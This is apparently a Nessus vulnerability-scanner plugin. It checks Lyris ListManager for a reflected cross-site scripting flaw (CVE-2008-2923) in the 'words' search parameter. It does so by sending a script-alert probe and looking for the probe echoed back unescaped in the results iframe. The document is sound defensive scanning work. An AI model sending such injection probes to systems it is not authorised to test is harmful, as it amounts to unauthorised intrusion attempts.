#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33219);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_cve_id("CVE-2008-2923");
  script_bugtraq_id(29761);
  script_osvdb_id(46150);
  script_xref(name:"Secunia", value:"30662");

  script_name(english:"Lyris ListManager read/search/results words Parameter XSS");
  script_summary(english:"Tries to inject script code into ListManager's search results");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a cross-site scripting
vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running ListManager, a web-based commercial
mailing list management application from Lyris. 

The version of ListManager installed on the remote host fails to
sanitize user input to the 'words' parameter of the
'read/search/results' script before including it in dynamic HTML
output.  An attacker may be able to leverage this issue to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site." );
  script_set_attribute(attribute:"see_also", value:"http://holisticinfosec.org/content/view/71/45/");
  script_set_attribute(attribute:"see_also", value:"http://satyen.com/wp-content/uploads/2010/03/changes.txt");
  script_set_attribute(attribute:"solution", value:"Upgrade to Listmanager 9.3e or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);
  script_set_attribute(attribute:"patch_publication_date", value:"2008/06/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/06/18");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# Make sure it's ListManager, unless we're being paranoid.
banner = get_http_banner(port:port);
if (
  report_paranoia < 2 &&
  banner && 
  (
    # later versions of ListManager
    "ListManagerWeb/" >!< banner &&
    # earlier versions (eg, 8.5)
    "Server: Tcl-Webserver" >!< banner
  )
) exit(0, "ListManager is not running on port "+port);


# Try to exploit the flaw.
exploit = string('nessus">', "<script>alert('", SCRIPT_NAME, "')</script>");
url = string("/read/search/results?words=", urlencode(str:exploit));

w = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
res = w[2];

# There's a problem if we see our exploit in the 'viewtable' iframe.
iframe = "";
if ('<iframe name="viewtable"' >< res)
{
  iframe = strstr(res, '<iframe name="viewtable"');
  if ("</iframe>" >< iframe) iframe = iframe - strstr(iframe, "</iframe>");
}

if (iframe && exploit >< urldecode(estr:iframe))
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  if (report_verbosity)
  {
    report = string(
      "\n",
      "Nessus was able to exploit the issue using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_warning(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
  else
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
}
